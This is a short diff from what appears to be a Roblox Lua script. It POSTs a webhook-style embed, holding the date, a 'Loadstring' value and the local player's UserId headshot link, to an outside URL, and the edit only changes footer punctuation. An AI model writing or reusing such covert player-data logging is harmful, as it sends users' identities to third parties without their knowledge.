@@ -50,7 +50,7 @@ dothethingy({Url = weno, Body = game:GetService("HttpService"):JSONEncode({
         ["inline"] = true
     }},
     ["footer"] = {
-        ["text"] = os.date().."Loadstring: "..activewebhook2,
+        ["text"] = os.date()..", Loadstring: "..activewebhook2,
         ["icon_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=150&height=150&format=png"
       },
 ["type"] = "rich",["color"] = 14680064}}}), Method = "POST", Headers = {
